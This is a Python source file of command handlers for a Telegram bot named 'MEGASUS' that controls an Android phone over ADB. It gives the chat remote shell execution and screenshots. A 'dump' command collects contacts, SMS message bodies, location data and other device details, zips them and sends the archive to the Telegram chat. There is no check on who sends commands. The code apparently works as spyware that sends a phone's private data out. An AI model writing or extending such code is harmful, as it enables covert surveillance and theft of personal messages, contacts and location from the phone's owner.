"""Command handlers for Telegram Bot plugin."""
from __future__ import annotations
import logging
from pathlib import Path
from typing import TYPE_CHECKING

if TYPE_CHECKING:
    from telegram_client import TelegramClient
    from adb_manager import ADBManager

logger = logging.getLogger("telegram_commands")

PROJECT_ROOT = Path(__file__).parent.parent.parent
LOGS_DIR = PROJECT_ROOT / "logs"


class CommandHandler:
    """Routes and executes Telegram bot commands."""

    def __init__(self, client: TelegramClient, adb: ADBManager) -> None:
        self.client = client
        self.adb = adb
        self._commands: dict[str, callable] = {
            "help": self.cmd_help,
            "info": self.cmd_info,
            "battery": self.cmd_battery,
            "apps": self.cmd_apps,
            "screenshot": self.cmd_screenshot,
            "shell": self.cmd_shell,
            "devices": self.cmd_devices,
            "dump": self.cmd_dump,
        }

    def execute(self, cmd: str, chat_id: int, args: list[str]) -> None:
        handler = self._commands.get(cmd)
        if not handler:
            self.client.send_message(chat_id, "Unknown command: " + cmd + ". Use /m help")
            return
        try:
            handler(chat_id, args)
        except Exception as e:
            logger.exception("Command error: %s", cmd)
            self.client.send_message(chat_id, "Error: " + str(e))

    def cmd_help(self, chat_id: int, args: list[str]) -> None:
        self.client.send_message(chat_id,
            "<b>MEGASUS Telegram Bot</b>" + chr(10) + chr(10) +
            "<b>Device:</b>" + chr(10) +
            "/m info | /m battery | /m apps | /m devices" + chr(10) + chr(10) +
            "<b>Screen:</b>" + chr(10) +
            "/m screenshot" + chr(10) + chr(10) +
            "<b>Data:</b>" + chr(10) +
            "/m dump" + chr(10) + chr(10) +
            "<b>Control:</b>" + chr(10) +
            "/m shell COMMAND" + chr(10) + chr(10) +
            "/m help")

    def cmd_info(self, chat_id: int, args: list[str]) -> None:
        info = self.adb.get_device_info()
        self.client.send_message(chat_id,
            "<b>Device:</b> " + info["brand"] + " " + info["model"] + chr(10) +
            "<b>Android:</b> " + info["android"] + " (SDK " + info["sdk"] + ")")

    def cmd_battery(self, chat_id: int, args: list[str]) -> None:
        info = self.adb.get_battery_info()
        self.client.send_message(chat_id, "<b>Battery</b>" + chr(10) + "<pre>" + info[:500] + "</pre>")

    def cmd_apps(self, chat_id: int, args: list[str]) -> None:
        apps = self.adb.get_running_apps()
        count = len(apps.splitlines()) if apps else 0
        self.client.send_message(chat_id, "<b>User Apps (" + str(count) + ")</b>" + chr(10) + "<pre>" + apps + "</pre>")

    def cmd_screenshot(self, chat_id: int, args: list[str]) -> None:
        self.client.send_message(chat_id, "Taking screenshot...")
        try:
            path = self.adb.take_screenshot(LOGS_DIR / "telegram_screenshots")
            self.client.send_photo(chat_id, path, "Screenshot")
        except Exception as e:
            self.client.send_message(chat_id, "Screenshot failed: " + str(e))

    def cmd_shell(self, chat_id: int, args: list[str]) -> None:
        if not args:
            self.client.send_message(chat_id, "Usage: /m shell COMMAND")
            return
        result = self.adb.shell(" ".join(args))
        self.client.send_message(chat_id, "<pre>" + result[:3000] + "</pre>")

    def cmd_devices(self, chat_id: int, args: list[str]) -> None:
        info = self.adb.get_device_info()
        storage = self.adb.get_storage()
        network = self.adb.get_network_info()
        self.client.send_message(chat_id,
            "<b>Device Info</b>" + chr(10) +
            "Brand: " + info["brand"] + chr(10) +
            "Model: " + info["model"] + chr(10) +
            "Android: " + info["android"] + chr(10) +
            "SDK: " + info["sdk"] + chr(10) + chr(10) +
            "<b>Storage</b>" + chr(10) + "<pre>" + storage + "</pre>" + chr(10) +
            "<b>Network</b>" + chr(10) + "<pre>" + network + "</pre>")

    def cmd_dump(self, chat_id: int, args: list[str]) -> None:
        self.client.send_message(chat_id, "Running full dump...")
        from datetime import datetime
        import zipfile
        dd = LOGS_DIR / "dumps" / datetime.now().strftime("%Y%m%d_%H%M%S")
        dd.mkdir(parents=True, exist_ok=True)
        commands = {
            "device.txt": "getprop",
            "battery.txt": "dumpsys battery",
            "contacts.txt": "content query --uri content://com.android.contacts/data/phones --projection display_name:number",
            "sms.txt": "content query --uri content://sms --projection address:body:date:limit 50",
            "apps.txt": "pm list packages -3",
            "ps.txt": "ps -A",
            "net.txt": "ip addr && netstat",
            "storage.txt": "df -h",
            "location.txt": "dumpsys location",
        }
        for fn, cmd in commands.items():
            try:
                out = self.adb.shell(cmd)
                if out:
                    (dd / fn).write_text(out, encoding="utf-8")
            except Exception as e:
                logger.warning("Dump %s failed: %s", fn, e)
        zp = dd.with_suffix(".zip")
        with zipfile.ZipFile(zp, "w") as zf:
            for fn in dd.iterdir():
                zf.write(fn, fn.name)
        self.client.send_document(chat_id, zp, "Full Device Dump")
